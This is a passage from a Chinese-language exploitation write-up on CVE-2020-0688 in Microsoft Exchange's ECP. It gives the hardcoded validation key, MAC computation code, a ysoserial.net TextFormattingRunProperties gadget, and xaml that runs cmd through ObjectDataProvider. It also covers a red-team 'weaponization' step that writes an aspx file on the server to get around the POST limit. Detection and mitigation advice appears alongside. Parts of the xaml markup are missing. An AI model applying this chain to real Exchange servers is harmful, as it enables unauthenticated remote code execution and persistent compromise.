正常访问default.aspx，复制ViewState的值，进行base64解码，并去掉最后`0x14`个字节。例如测试环境中的ViewState解码后的数据为`ff010f0f050a2d3231303138363636396464`。
之后修改前面的代码：
    byte[] data=new byte[]{0xff,0x01,0x0f,0x0f,0x05,0x0a,0x2d,0x32,0x31,0x30,0x31,0x38,0x36,0x36,0x36,0x39,0x64,0x64};
    byte[] key=new byte[]{0xCB,0x27,0x21,0xAB,0xDA,0xF8,0xE9,0xDC,0x51,0x6D,0x62,0x1D,0x8B,0x8B,0xF1,0x3A,0x2C,0x9E,0x86,0x89,0xA2, 0x53,0x03,0xBF};
    int hashcode = StringComparer.InvariantCultureIgnoreCase.GetHashCode("/ecp");
    uint _clientstateid=(uint)(hashcode+StringComparer.InvariantCultureIgnoreCase.GetHashCode("default_aspx"));
    //....
    byte[] hash=(new HMACSHA1(key)).ComputeHash(ms.ToArray());
执行，返回以下结果：
可以看到`ClientId`是正确的，而`Hash`不同，显然页面存在`ViewStateUserKey`。
修改页面输出`ViewStateUserKey`，可看到和cookie中`ASP.NET_SessionId`相同。
而我们知道Exchange使用cookie登录而不是Session，在web.config中也`移除`了Session模块：
所以可推测ViewStateUserKey完全由客户端控制，将cookie中ASP.NET_SessionId`置空`，此时远程返回了相同的ViewState：
证明推论正确，这将在后续操作中节约几个步骤。
###  0x23 更换payload进行初步利用
现在再反过来思考绕过的问题，首先处理程序映射属于asp.net的核心部分，不可能绕过；501检测位置不明，但删除POST包中的Content-Type后依然返回501，证明检测逻辑很可能为`if(Method=="GET" &&
ContentLength>0){501;}`；最后只剩下减小payload长度一种方式。
ysoserial.net提供了很多的payload，我们可以尝试一下其他generator，例如`TextFormattingRunProperties`：
    ysoserial.exe -g TextFormattingRunProperties -c notepad -f binaryformatter >out.dat
将`GetViewState`方法中的数据进行替换，执行并生成ViewState，使用burp将cookie中ASP.NET_SessionId置空，访问，远程返回500，同时执行了命令`cmd
/c notepad`。
### 0x24 xaml与代码执行
借助TextFormattingRunPropertiesGenerator，我们能够成功的通过ecp达到Exchange
Server的远程代码执行，但其中的原理是什么？能否进行更深入层次的运用？
查看ysoserial.net源码可发现，TextFormattingRunPropertiesGenerator会返回一个`[Microsoft.PowerShell.Editor]Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties`对象的序列化数据，同时添加了一个键名为`ForegroundBrush`，值为`xaml字符串`的序列化信息。
    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
      Type typeTFRP = typeof(TextFormattingRunProperties);
      info.SetType(typeTFRP);
      info.AddValue("ForegroundBrush", _xaml);
    }
查看`Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties..ctor(SerializationInfo,StreamingContext)`的代码，可以看到在反序列化过程中会取出这个xaml，之后调用`[PresentationFramework]System.Windows.Markup.XamlReader.Parse`进行解析：
    private object GetObjectFromSerializationInfo(string name, SerializationInfo info)
    {
        string @string = info.GetString(name);
        if (@string == "null")
        {
            return null;
        }
        return XamlReader.Parse(@string);
    }
其调用堆栈大致如下：
    [PresentationFramework]System.Windows.Markup.XamlReader.Parse
    Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties.GetObjectFromSerializationInfo
    Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties..ctor
xaml是wpf的界面组件代码，可以通过xml的形式构建窗体对象或存放运行时所需的资源。在执行`XamlReader.Parse`时会实例化其中声明的对象，并绑定属性。
在解析器的实现中，`ResourceDictionary`负责对静态资源进行存储，`ObjectDataProvider`作为工厂类负责通过方法调用等方式生成对象。如果为ObjectDataProvider提供恶意方法，同样可以达到代码执行的目的。
对照ysoserial.net生成的xaml：第一行表示该xaml为一个ResourceDictionary对象；第二行将`System`、`System.Diagnostics`两个命名空间和xmlns进行映射；第三行声明了一个ObjectDataProvider，并将其`ObjectType`属性赋值为`typeof(System.Diagnostics.Process)`，`MethodName`属性赋值为`Start`；第四行至第七行声明了调用该方法是要传递的参数，分别为`cmd`和`"/c
notepad"`。
            cmd
            "/c notepad"
XamlReader在解析上述xaml时，首先根据根元素创建`ResourceDictionary`对象，该对象实现了IDirectory接口，所以其后的ObjectDataProvider将作为成员进行存储。接下来初始化`ObjectDataProvider`对象，并设置`ObjectType`、`MethodName`、`MethodParameters`三个属性。
ObjectDataProvider在`MethodParameters`改变时会调用`OnParametersChanged`方法，最终将通过反射调用`Process.Start`，并传递参数。其流程和以下伪代码相对应：
    typeof(Process).GetMethod("Start").Invoke(null,new object[]{"cmd",""/c notepad""})
可将xaml进行保存，然后执行下面的PowerShell脚本进行验证：
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.Markup.XamlReader]::Parse([io.file]::readalltext('xaml.txt'))
最后，我们可以将ysoserial.net中相关代码提取出来，稍作修改和之前的代码合并作为生成器：
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
      protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context){}
      string _xaml;
      public void GetObjectData(SerializationInfo info, StreamingContext context)
      {
        info.SetType(typeof(TextFormattingRunProperties));
        info.AddValue("ForegroundBrush", _xaml);
      }
      public TextFormattingRunPropertiesMarshal(string xaml)
      {
        _xaml = xaml;
      }
    }
    static byte[] GetViewState(byte[] data){....}
    //in main
    byte[] data=GetViewState(Serialize(new TextFormattingRunPropertiesMarshal(xa)));
成功执行命令仅仅是一个开始。无论红队还是蓝队，在目标无法出网的情况下，单纯的执行命令既不能判断漏洞存在与否，也很难达成稳定隐蔽的控制。
请记住`xaml`这个关键点，在后续的漏洞利用过程中是最为重要的一环。
## 0x30 蓝队：检测与缓解措施
###  0x31 构造检测xaml
在远程无回显地执行命令很难确切地知道漏洞利用成功与否，由于不确定目标环境是否能够出网，即使有dnslog这种方式也很难做到完整检测。
所以我们需要一种简单的方式进行验证。
xaml不光支持调用`静态方法`，同样支持获取`静态属性`、获取`实例属性`或调用`实例方法`。于是可以通过`[System.Web]System.Web.HttpContext::Current`获取当前Http上下文，并对`Response`进行操作。
          X-ZCG-TEST
          CVE-2020-0688
上述xaml在加载时的流程等同于：
    var a=HttpContext.Current;
    var b=a.Response;
    var c=b.Headers;
    c.Add("X-ZCG-TEST","CVE-2020-0688");
    b.End();
修改生成payload，访问，可看到增加了一个返回头`X-ZCG-TEST`，其值为`CVE-2020-0688`。和执行命令的poc不同，由于调用了`Response.End`，不会导致后续异常，返回状态码为正常的`200`。
当然，调用诸如`Response.AppendCookie`、`Response.AddHeader`等方法都是可以的，只要最终生成的QueryString不超过`2048`就不会有任何问题。
###  0x32 修复措施
由于ecp本身不使用任何ViewState相关的方法（事实上在多个页面中禁用了ViewState），最简单的修复方式就是删除web.config中`machineKey`一节：
之后ecp会自动重启，随后将采用随机生成的0x400长度的key进行加密。
## 0x40 红队：武器化
###  0x41 绕过POST限制
红队操作更考虑隐蔽以及稳定控制，限制长度的Payload具有非常大的局限性，很难实现完美控制。
POST不受长度限制但默认被禁用，所有不需要权限的白名单文件均不存在。如果创建一个原本不存在的白名单文件，能否进行绕过？
那么进行测试，从web.config中随便挑一个允许POST且不存在的aspx文件，例如`LiveIdError.aspx`。在测试环境的ecp目录创建这个空文件。
之后修改之前的代码：
    uint _clientstateid=(uint)(hashcode+StringComparer.InvariantCultureIgnoreCase.GetHashCode("liveiderror_aspx"));
编译执行访问，可看到返回了测试标识，证明思路有效。
###  0x42 构造写入文件的xaml
那么现在的问题就变成了：如何通过简短的反序列化，在ecp目录创建一个指定名称的空白文件？熟悉.net的人可能会瞬间给出答案，`System.IO.File::AppendAllText(string,string)`可以向指定路径的文件追加指定内容，当文件不存在时会创建。
使用此方法还有一个小问题，AppendAllText第一个参数如果是相对路径的话，将在`CurrentDirectory`创建文件，而绝大多数情况下w3wp的CurrentDirectory为`%systemroot%system32inetsrv`。
简单粗暴的解决这个问题有两种方案：由于Exchange会将安装目录保存在环境变量`ExchangeInstallPath`中，所以直接调用cmd进行echo即可；或者直接使用默认安装路径`C:Program
FilesMicrosoftExchange ServerV15ClientAccessecp`。  
第一种可能会触发某些监控，第二种则存在小概率修改目录的可能。
这两种方案的xaml分别如下：
            cmd
            "/c cd %ExchangeInstallPath% &amp;&amp; echo . > ClientAccessecpLiveIdError.aspx"
          C:Program FilesMicrosoftExchange ServerV15ClientAccessecpLiveIdError.aspx